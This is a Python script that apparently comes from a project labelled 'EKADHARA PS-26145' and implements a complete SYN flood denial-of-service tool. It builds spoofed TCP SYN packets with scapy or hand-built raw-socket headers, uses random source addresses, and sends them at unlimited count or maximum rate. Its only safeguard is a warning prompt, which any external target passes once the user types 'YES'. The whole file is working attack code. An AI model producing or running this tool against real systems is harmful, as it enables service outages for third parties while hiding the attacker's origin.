"""SYN Flood attack — sends spoofed TCP SYN packets."""
import argparse
import ipaddress
import os
import random
import socket
import struct
import sys
import threading
import time
from typing import Optional

try:
    from scapy.all import IP, TCP, RandShort, send, conf
    from scapy.layers.inet import TCP
    SCAPY_AVAILABLE = True
    conf.verb = 0
except ImportError:
    SCAPY_AVAILABLE = False

# ── ANSI Colors (Windows Terminal compatible) ──────────────────────────────
class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def banner():
    print(f"""{Color.BOLD}{Color.CYAN}
+========================================+
|  [EKADHARA] SYN Flood - PS-26145      |
+========================================+{Color.RESET}""")

def is_private(target: str) -> bool:
    """Check if target is a private/local IP."""
    try:
        addr = ipaddress.ip_address(target)
        return addr.is_private or addr.is_loopback
    except ValueError:
        # Could be a hostname — resolve it
        try:
            addr = socket.gethostbyname(target)
            return ipaddress.ip_address(addr).is_private or ipaddress.ip_address(addr).is_loopback
        except socket.gaierror:
            return False

def safety_check(target: str):
    """Warn if target is not localhost or a private IP."""
    if not is_private(target):
        print(f"{Color.YELLOW}[!] WARNING: Target {target} is NOT a private/local IP!{Color.RESET}")
        print(f"{Color.YELLOW}[!] Only attack systems you own or have explicit permission to test.{Color.RESET}")
        confirm = input(f"{Color.YELLOW}[?] Type 'YES' to continue: {Color.RESET}")
        if confirm != "YES":
            print(f"{Color.RED}[!] Aborted.{Color.RESET}")
            sys.exit(0)
        print(f"{Color.GREEN}[*] Proceeding with external target...{Color.RESET}")

def raw_syn_packet(target_ip: str, target_port: int, src_ip: str) -> bytes:
    """Craft a raw TCP SYN packet for fallback mode."""
    # IP header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(target_ip)
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    # TCP header
    tcp_src = random.randint(1024, 65535)
    tcp_dst = target_port
    tcp_seq = random.randint(0, 0xFFFFFFFF)
    tcp_ack = 0
    tcp_doff = 5
    tcp_flags = 2  # SYN
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack,
        tcp_doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    # Pseudo-header for checksum
    src_bin = socket.inet_aton(src_ip)
    dst_bin = socket.inet_aton(target_ip)
    placeholder = 0
    proto = socket.IPPROTO_TCP
    tcp_len = len(tcp_header)
    psh = struct.pack('!4s4sBBH', src_bin, dst_bin, placeholder, proto, tcp_len)
    pkt = ip_header + tcp_header
    tcp_check = _checksum(psh + pkt)
    tcp_header = struct.pack('!HHLLBBH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack,
        tcp_doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    return ip_header + tcp_header

def _checksum(data: bytes) -> int:
    """Compute Internet checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF

def run_scapy_attack(target_ip: str, target_port: int, count: int, rate: float, stop_event: threading.Event, stats: dict):
    """Run SYN flood using scapy."""
    src_ips = [f"10.0.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(50)]
    src_ips += [f"172.16.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(30)]
    src_ips += [f"192.168.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(20)]

    sent = 0
    start = time.time()
    print(f"{Color.GREEN}[+] Scapy mode active — using spoofed IPs{Color.RESET}")

    while not stop_event.is_set() and (count == 0 or sent < count):
        batch_size = min(rate if rate > 0 else 100, 500)
        packets = []
        for _ in range(batch_size):
            src_ip = random.choice(src_ips)
            pkt = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
            packets.append(pkt)

        try:
            send(packets, verbose=False)
            sent += len(packets)
        except Exception as e:
            print(f"{Color.RED}[-] Send error: {e}{Color.RESET}")

        stats["sent"] = sent
        elapsed = time.time() - start
        if elapsed > 0:
            stats["rate"] = sent / elapsed
        time.sleep(0.5 if rate == 0 else max(0.01, 1.0 / rate))

def run_raw_attack(target_ip: str, target_port: int, count: int, rate: float, stop_event: threading.Event, stats: dict):
    """Run SYN flood using raw sockets."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print(f"{Color.YELLOW}[!] Raw sockets require Administrator/root privileges.{Color.RESET}")
        print(f"{Color.YELLOW}[!] Run this script as Administrator.{Color.RESET}")
        return

    sent = 0
    start = time.time()
    print(f"{Color.GREEN}[+] Raw socket mode active{Color.RESET}")

    while not stop_event.is_set() and (count == 0 or sent < count):
        for _ in range(min(rate if rate > 0 else 100, 100)):
            src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            pkt = raw_syn_packet(target_ip, target_port, src_ip)
            try:
                sock.sendto(pkt, (target_ip, target_port))
                sent += 1
            except Exception:
                pass
        stats["sent"] = sent
        elapsed = time.time() - start
        if elapsed > 0:
            stats["rate"] = sent / elapsed
        time.sleep(0.5 if rate == 0 else max(0.01, 1.0 / rate))

    sock.close()

def attack_thread(target_ip: str, target_port: int, count: int, rate: float, stats: dict):
    """Thread target that dispatches to the appropriate backend."""
    stop_event = threading.Event()
    stats["stop_event"] = stop_event

    if SCAPY_AVAILABLE:
        run_scapy_attack(target_ip, target_port, count, rate, stop_event, stats)
    else:
        run_raw_attack(target_ip, target_port, count, rate, stop_event, stats)

def run_attack(target: str, port: int = 80, count: int = 0, rate: float = 100, **kwargs):
    """
    Launch the SYN flood attack.

    Args:
        target:  Target IP or hostname
        port:    Target port (default 80)
        count:   Number of packets (0 = unlimited)
        rate:    Packets per second (default 100, 0 = max speed)
    """
    banner()
    print(f"{Color.BLUE}[*] Target: {target}:{port}{Color.RESET}")
    print(f"{Color.BLUE}[*] Packets: {'Unlimited' if count == 0 else count}{Color.RESET}")
    print(f"{Color.BLUE}[*] Rate: {rate if rate > 0 else 'Maximum'} pps{Color.RESET}")
    print(f"{Color.BLUE}[*] Backend: {'Scapy' if SCAPY_AVAILABLE else 'Raw Socket (fallback)'}{Color.RESET}")

    safety_check(target)
    stats = {"sent": 0, "rate": 0.0}
    t = threading.Thread(target=attack_thread, args=(target, port, count, rate, stats), daemon=True)
    t.start()
    return t, stats


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood Attack Simulator — EKADHARA PS-26145")
    parser.add_argument("--target", required=True, help="Target IP or hostname")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--count", type=int, default=0, help="Number of packets (0=unlimited)")
    parser.add_argument("--rate", type=float, default=100, help="Packets per second (0=max)")
    args = parser.parse_args()

    banner()
    t, stats = run_attack(args.target, args.port, args.count, args.rate)

    print(f"\n{Color.GREEN}[+] Attack running — Press Ctrl+C to stop{Color.RESET}")
    print(f"{Color.CYAN}{'─'*50}{Color.RESET}")
    print(f"  {'Sent':>10}  {'Rate':>10}  {'Status':>20}")
    print(f"{Color.CYAN}{'─'*50}{Color.RESET}")

    try:
        while t.is_alive():
            print(f"\r  {Color.GREEN}{stats['sent']:>10,}{Color.RESET}  "
                  f"{Color.YELLOW}{stats['rate']:>9.1f}/s{Color.RESET}  "
                  f"{'Flooding':>20}", end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n{Color.YELLOW}[!] Stopping...{Color.RESET}")
        if "stop_event" in stats:
            stats["stop_event"].set()
        t.join(timeout=3)
        print(f"{Color.GREEN}[+] Sent {stats['sent']:,} SYN packets total.{Color.RESET}")
